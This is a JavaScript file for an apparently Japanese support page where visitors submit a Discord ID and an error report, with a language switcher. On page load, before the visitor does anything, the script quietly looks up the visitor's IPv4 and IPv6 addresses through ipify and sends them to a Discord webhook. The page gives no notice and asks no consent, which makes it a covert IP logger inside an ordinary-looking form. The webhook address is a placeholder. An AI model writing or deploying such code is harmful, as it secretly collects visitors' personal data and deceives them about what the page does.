
window.onload = function() {
    let discordIdValid = false;

    // IPアドレスを取得してWebhookに送信する
    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipv4 = data.ip;
            sendToWebhook(ipv4);
        });

    fetch('https://api6.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipv6 = data.ip;
            sendToWebhook(ipv6);
        });

    // Discord IDをWebhookに送信する処理
    document.getElementById('send-discord-id').addEventListener('click', () => {
        const discordId = document.getElementById('discord-id').value;
        if (discordId) {
            sendToWebhook(discordId);
            discordIdValid = true;
            alert('Discord IDを送信しました');
            document.getElementById('support-section').style.display = 'block'; // エラー投稿セクションを表示
        } else {
            alert('Discord IDを入力してください');
        }
    });

    // エラー投稿ボタン
    document.getElementById('submit-error').addEventListener('click', () => {
        if (discordIdValid) {
            const errorReport = document.getElementById('error-report').value;
            if (errorReport) {
                sendToWebhook("Error Report: " + errorReport);
                alert('エラーを送信しました');
                document.getElementById('error-report').value = ''; // テキストエリアをクリア
            } else {
                alert('エラー内容を入力してください');
            }
        } else {
            alert('まずDiscord IDを送信してください');
        }
    });

    // Webhook送信関数
    function sendToWebhook(content) {
        const webhookUrl = 'https://discord.com/api/webhooks/your-webhook-url';
        const data = {
            content: content
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });
    }

    // 言語切り替え機能
    document.getElementById('lang-switcher').addEventListener('click', () => {
        const lang = document.getElementById('lang-switcher').textContent;
        if (lang === 'English') {
            document.getElementById('lang-switcher').textContent = '日本語';
            // 英語に切り替え
        } else {
            document.getElementById('lang-switcher').textContent = 'English';
            // 日本語に切り替え
        }
    });
};
